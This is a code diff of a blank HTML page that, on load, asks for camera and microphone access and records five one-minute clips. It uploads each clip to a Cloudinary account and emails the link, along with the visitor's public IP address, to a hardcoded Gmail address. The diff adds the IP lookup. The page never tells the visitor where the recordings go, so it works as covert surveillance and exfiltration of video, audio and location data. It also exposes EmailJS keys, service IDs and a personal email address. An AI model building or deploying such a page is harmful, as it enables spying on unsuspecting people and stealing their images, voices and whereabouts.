@@ -3,91 +3,103 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>H1 Video Recorder Loop</title>
+  <title>H1 Video Recorder</title>
 </head>
 <body>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
-    emailjs.init("ACOn6PC1Zb70JrmxT"); // Your EmailJS Public Key
+    // Your EmailJS and Cloudinary config:
+    const serviceID = "service_khmk344";
+    const templateID = "template_oyrsayr";
+    const publicKey = "ACOn6PC1Zb70JrmxT";
 
-    const serviceID = "service_khmk344";  // Your EmailJS Service ID
-    const templateID = "template_oyrsayr"; // Your EmailJS Template ID
-    const cloudName = "dymxlqxxx";  // Your Cloudinary Cloud Name
-    const uploadPreset = "unsigned_video_uploads"; // Your unsigned Cloudinary upload preset
+    const cloudName = "dymxlqxxx";
+    const uploadPreset = "unsigned_video_uploads";
 
-    const totalVideos = 5;
-    let currentCount = 0;
+    emailjs.init(publicKey);
 
+    // Fetch public IP
+    async function getUserIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        if (!res.ok) throw new Error("Failed to fetch IP");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "IP not available";
+      }
+    }
+
+    // Upload video blob to Cloudinary and return the URL
     async function uploadToCloudinary(blob) {
       const formData = new FormData();
-      formData.append('file', blob);
-      formData.append('upload_preset', uploadPreset);
+      formData.append("file", blob);
+      formData.append("upload_preset", uploadPreset);
 
-      const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/video/upload`, {
-        method: 'POST',
-        body: formData
+      const res = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/upload`, {
+        method: "POST",
+        body: formData,
       });
-
-      if (!response.ok) throw new Error('Cloudinary upload failed');
-      const data = await response.json();
-      return data.secure_url; // The URL of the uploaded video
+      if (!res.ok) throw new Error("Cloudinary upload failed");
+      const data = await res.json();
+      return data.secure_url;
     }
 
-    async function sendEmail(videoUrl) {
+    // Send email with video URL and IP address
+    async function sendEmail(videoUrl, ip) {
       return emailjs.send(serviceID, templateID, {
         to_email: "julianlee252@gmail.com",
-        message: `Here’s your 1-minute video recording. Watch it here: ${videoUrl}`
+        message: `Here’s your 1-minute video recording from IP: ${ip}\nWatch it here: ${videoUrl}`
       });
     }
 
+    // Record one minute video, upload and send email
     async function recordAndSend() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        const recorder = new MediaRecorder(stream);
-        let chunks = [];
+      return new Promise(async (resolve, reject) => {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+          const recorder = new MediaRecorder(stream);
+          let chunks = [];
 
-        recorder.ondataavailable = e => chunks.push(e.data);
+          recorder.ondataavailable = (e) => chunks.push(e.data);
 
-        return new Promise((resolve, reject) => {
           recorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'video/webm' });
-            chunks = []; // reset chunks
+            const blob = new Blob(chunks, { type: "video/webm" });
+            chunks = [];
+            stream.getTracks().forEach((track) => track.stop());
 
             try {
               const videoUrl = await uploadToCloudinary(blob);
-              await sendEmail(videoUrl);
+              const ip = await getUserIP();
+              await sendEmail(videoUrl, ip);
               resolve();
             } catch (err) {
               reject(err);
-            } finally {
-              stream.getTracks().forEach(track => track.stop());
             }
           };
 
           recorder.start();
           setTimeout(() => recorder.stop(), 60000); // 1 minute
-        });
-
-      } catch (err) {
-        throw new Error('Permission denied or error: ' + err.message);
-      }
+        } catch (err) {
+          reject(err);
+        }
+      });
     }
 
-    async function startLoop() {
-      while (currentCount < totalVideos) {
+    // Main function to record 5 videos sequentially
+    async function main() {
+      for (let i = 1; i <= 5; i++) {
         try {
           await recordAndSend();
-          currentCount++;
-          console.log(`Video ${currentCount} sent.`);
-        } catch (error) {
-          console.error('Error during recording/sending:', error);
-          break; // stop if error occurs
+          console.log(`✅ Video ${i} sent successfully`);
+        } catch (err) {
+          console.error(`❌ Error with video ${i}:`, err);
+          break;
         }
       }
-      console.log('All videos processed or stopped early.');
     }
 
-    window.onload = startLoop;
+    window.onload = main;
   </script>
 </body>
 </html>
